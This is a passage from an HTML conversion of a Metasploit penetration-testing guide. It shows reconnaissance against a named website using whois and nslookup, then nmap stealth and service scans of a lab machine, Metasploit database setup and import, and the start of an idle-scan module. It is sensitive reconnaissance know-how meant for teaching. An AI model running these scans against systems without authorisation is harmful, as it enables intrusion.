19pt;text-indent: 0pt;text-align: left;"><span><img width="537" height="103" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_036.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Figure 3-1: Use Netcraft to find the IP address of the server hosting a particular website.</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Having identified <span class="s19">secmaniac.net</span>’s IP address as 75.118.185.142, we do another <span class="s19">whois </span>lookup on that IP address:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_037.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">whois 75.118.185.142</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] exec: whois 75.118.185.142</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">WideOpenWest Finance LLC WIDEOPENWEST (NET-75-118-0-0-1)</p><p class="s25" style="padding-left: 234pt;text-indent: 0pt;line-height: 11pt;text-align: left;">75.118.0.0 - 75.118.255.255</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">WIDEOPENWEST OHIO WOW-CL11-1-184-118-75 (NET-75-118-184-0-1)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 234pt;text-indent: 0pt;line-height: 11pt;text-align: left;">75.118.184.0 - 75.118.191.255</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_038.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We see from the <span class="s19">whois </span>lookup and a quick search that this IP (<span class="s19">WIDEOPENWEST</span>) appears to be a legitimate service provider. While the actual subnet range isn’t specifically registered to <span class="s19">secmaniac.net </span>or <span class="s19">secmaniac.com</span>, we can tell that this site appears to be hosted inside the author’s home, because the IP block appears to be part of a residential range.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark92">NSLookup</a><a name="bookmark110">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">To get additional server information, we’ll use Back|Track to leverage <span class="s25">nslookup</span>, a tool built into most operating systems, to find information about <span class="s19">secmaniac.net</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_039.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:~# <span class="s24">nslookup set type=mx</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&gt; <span class="s24">secmaniac.net</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Server: 172.16.32.2</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Address: 172.16. 32.2#53</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Non-authoritative answer:</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">secmaniac.net mail exchanger = 10 mailstore1.secureserver.net. secmaniac.net mail exchanger = 0 smtp.secureserver.net.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_040.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: justify;">We see in this listing that the mail servers are pointing to <span class="s19">mailstore1</span></p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">.secureserver.net <span class="p">and </span>smtp.secureserver.net<span class="p">. Some quick research on these mail servers tells us that this website is hosted by a third party, which would not be within the scope of our penetration test.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">At this point, we have gathered some valuable information that we might be able to use against the target later on. Ultimately, however, we have to resort to active information gathering techniques to determine the actual target IP, which is 75.118.185.142.</p><p class="s19" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: justify;"><span class="s22">NOTE </span>Passive information gathering is an art that is not easily mastered in just a few pages of discussion. See the <a href="http://www.pentest-standard.org/)" class="s31" target="_blank">Penetration Testing Execution Standard (PTES; http:// </a><span class="p">www.pentest-standard.org/) </span>for a list of potential ways to perform additional pas- sive intelligence gathering.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark93">Active Information Gathering</a><a name="bookmark111">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In active information gathering, we interact directly with a system to learn more about it. We might, for example, conduct port scans for open ports on the target or conduct scans to determine what services are running. Each system or running service that we discover gives us another opportunity for exploita- tion. But beware: If you get careless while active information gathering, you might be nabbed by an IDS or intrusion prevention system (IPS)—not a good outcome for the covert penetration tester.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark94">Port Scanning with Nmap</a><a name="bookmark112">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Having identified the target IP range with passive information gathering as well as the <span class="s19">secmaniac.net </span>target IP address, we can begin to scan for open ports on the target by <span class="s19">port scanning</span>, a process whereby we meticulously connect to ports on the remote host to identify those that are active. (Obviously, in a larger enterprise, we would have multiple IP ranges and things to attack instead of only one IP.)</p><p class="s19" style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Nmap <span class="p">is, by far, the most popular port scanning tool. It integrates with Metasploit quite elegantly, storing scan output in a database backend for</span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">later use. <span class="s19">Nmap </span>lets you scan hosts to identify the services running on each, any of which might offer a way in.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">For this example, let’s leave <span class="s19">secmaniac.net </span>behind and turn to the virtual machine described in Appendix A, with IP address 172.16.32.131. Before we get started, take a quick look at the basic <span class="s19">nmap </span>syntax by entering <span class="s24">nmap </span>from the command line on your Back|Track machine.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">You’ll see immediately that <span class="s19">nmap </span>has a quite a few options, but you’ll use just a few of them for the most part.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">One of our preferred <span class="s19">nmap </span>options is <span class="s25">-sS</span>. This runs a stealth TCP scan that determines whether a specific TCP-based port is open. Another preferred option is <span class="s25">-Pn</span>, which tells <span class="s19">nmap </span>not to use <span class="s25">ping </span>to determine whether a system is running; instead, it considers all hosts “alive.” If you’re performing Internet- based penetration tests, you should use this flag, because most networks don’t allow Internet Control Message Protocol (ICMP), which is the protocol that <span class="s25">ping </span>uses. If you’re performing this scan internally, you can probably ignore this flag.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now let’s run a quick <span class="s19">nmap </span>scan against our Windows XP machine using both the <span class="s25">-sS </span>and <span class="s25">-Pn </span>flags.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_041.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:~# <span class="s24">nmap -sS -Pn 172.16.32.131 </span>Nmap scan report for 172.16.32.131 Host is up (0.00057s latency).</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Not shown: 990 closed ports PORT STATE SERVICE</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">21/tcp open ftp 25/tcp open smtp 80/tcp open http 135/tcp open msrpc</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 1025/tcp open NFS-or-IIS 1433/tcp open ms-sql-s 3389/tcp open ms-term-serv</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_042.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As you can see, <span class="s19">nmap </span>reports a list of open ports, along with a description of the associated service for each.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">For more detail, try using the <span class="s25">-A </span>flag. This option will attempt advanced service enumeration and banner grabbing, which may give you even more details about the target system. For example, here’s what we’d see if we were to call <span class="s19">nmap </span>with the <span class="s25">-sS </span>and <span class="s25">-A </span>flags, using our same target system:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_043.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:~# <span class="s24">nmap -Pn -sS -A 172.16.32.131</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Nmap scan report for 172.16.32.131 Host is up (0.0035s latency).</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Not shown: 993 closed ports</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">PORT STATE SERVICE VERSION</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds</p><table style="border-collapse:collapse;margin-left:88pt" cellspacing="0"><tr style="height:31pt"><td style="width:62pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">777/tcp open</p><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 11pt;text-align: left;">1039/tcp open</p><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1138/tcp open</p></td><td style="width:49pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">unknown</p><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 11pt;text-align: left;">unknown</p><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msrpc</p></td><td style="width:183pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Microsoft Windows RPC</p></td></tr><tr style="height:10pt"><td style="width:62pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">1433/tcp open</p></td><td style="width:49pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ms-sql-s</p></td><td style="width:183pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Microsoft SQL Server 2005 9.00.1399; RTM</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Device type: general purpose Running: Microsoft Windows XP|2003</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003 Network Distance: 1 hop</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Service Info: OS: Windows</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Host script results:</p><p class="s25" style="padding-left: 107pt;text-indent: -17pt;text-align: left;">|_nbstat: NetBIOS name: V-MAC-XP, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:c9:38:4c (VMware)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">|_smbv2-enabled: Server doesn&#39;t support SMBv2 protocol</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| smb-os-discovery:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| OS: Windows XP (Windows 2000 LAN Manager)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">| Name: WORKGROUP\V-MAC-XP</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_044.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark95">Working with Databases in Metasploit</a><a name="bookmark113">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When you’re running a complex penetration test with a lot of targets, keep- ing track of everything can be a challenge. Luckily, Metasploit has you cov- ered with expansive support for multiple database systems.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To ensure that database support is available for your system, you should first decide which database system you want to run. Metasploit supports MySQL and PostgreSQL; because PostgreSQL is the default, we’ll stick with it in this discussion.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">First, we start the database subsystem using the built-in Back|Track <span class="s19">init.d</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">scripts.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_045.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt~# <span class="s24">/etc/init.d/postgresql-8.3 start</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_046.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">After PostgreSQL has started, we tell the Framework to connect to the database instance. This connection requires a username, password, name of the host on which the database is running, and the database name we want to use. Back|Track’s default PostgreSQL username is <span class="s19">postgres </span>with the password <span class="s19">toor</span>, but we’ll use <span class="s19">msfbook </span>as the database name. Let’s make the connection.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_047.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt; <span class="s24">db_connect postgres:toor@127.0.0.1/msfbook</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_048.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">If this were the first time we connected to the database name, we would see a lot of text output as Metasploit sets up all the necessary tables. Other- wise, the command will return to the <span class="s25">msfconsole </span>prompt.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Metasploit provides a number of commands that we can use to interact with the database, as you’ll see throughout this book. (For a complete list, enter <span class="s24">help</span>.) For now, we’ll use <span class="s25">db_status </span>to make sure that we’re connected correctly.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_049.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_status</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] postgresql connected to msfbook</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_050.png"/></span></p><p style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Everything seems to be set up just fine.</p><p class="s23" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Importing Nmap Results into Metasploit</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When you are working with other team members, with various individuals scanning at different times and from different locations, it helps to know how to run <span class="s19">nmap </span>on its own and then import its results into the Framework. Next, we’ll examine how to import a basic <span class="s19">nmap</span>-generated XML export file (generated with <span class="s19">nmap</span>’s <span class="s25">-oX </span>option) into the Framework.</p><p style="padding-left: 90pt;text-indent: 17pt;text-align: left;">First, we scan the Windows virtual machine using the <span class="s25">-oX </span>option to gener- ate a <span class="s19">Subnet1.xml </span>file:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_051.png"/></span></p><p class="s24" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">nmap -Pn -sS -A -oX Subnet1 192.168.1.0/24</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_052.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">After generating the XML file, we use the <span class="s25">db_import </span>command to import it into our database. We can then verify that the import worked by using the <span class="s25">db_hosts </span>command, which lists the systems entries that have been created, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_053.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_connect postgres:toor@127.0.0.1/msf3</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_import  Subnet1.xml</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_hosts -c address</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Hosts</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=====</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">address</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="40" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_054.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.1</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.10</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.101</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.102</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.109</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.116</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.142</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.152</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.154</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.171</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.155</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.174</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.180</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.181</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.2</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">192.168.1.99</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">msf &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="431" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_055.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This tells us that we’ve successfully imported the output of our <span class="s19">nmap </span>scans into Metasploit, as evidenced by the IP addresses populated when we run the <span class="s25">db_hosts </span>commands.</p><p class="s23" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Advanced Nmap Scanning: TCP Idle Scan</p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><span class="p">A more advanced </span>nmap <span class="p">scan method, </span>TCP idle scan<a href="http://www.metasploit.com/modules/auxiliary/" class="s31" target="_blank">, allows us to scan a target stealthily by spoofing the IP address of another host on the network. For this type of scan to work, we first need to locate an idle host on the network that uses incremental IP IDs (which are used to track packet order). When we discover an idle system that uses incremental IP IDs, the IP IDs become pre- dictable, and we can then predict the next ID. However, when spoofing the address of an idle host while scanning a target’s responses from open ports, we can see a break in the predictability of the IP ID sequence, which indi- cates that we have discovered an open port. (To learn more about this mod- ule and IP ID sequences, visit </a>http://www.metasploit.com/modules/auxiliary/ scanner/ip/ipidseq/<span class="p">.)</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Use the Framework’s <span class="s19">scanner/ip/ipidseq </span>module to scan for a host that fits the TCP idle scan requirements, as shown next:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_056.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use auxiliary/scanner/ip/ipidseq</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(ipidseq) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:26.0188pt" cellspacing="0"><tr style="height:16pt"><td style="width:23pt" colspan="2" rowspan="4"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:47pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:214pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:47pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">GWHOST</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:214pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The gateway IP address</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">INTERFACE</p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:214pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The name of the interface</p></td></tr><tr style="height:11pt"><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">LHOST</p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:214pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The local IP address</p></td></tr><tr style="height:11pt"><td style="width:10pt"><p class="s33" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">O</p></td><td style="width:13pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS</p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:214pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target address range or CIDR identifier</p></td></tr><tr style="height:11pt"><td style="width:10pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:13pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">80</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:214pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:11pt"><td style="width:10pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:13pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:47pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SNAPLEN</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">65535</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:214pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The number of bytes to capture</p></td></tr><tr style="height:11pt"><td style="width:10pt"><p class="s33" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">8</p></td><td style="width:13pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:47pt"><p class="s28" 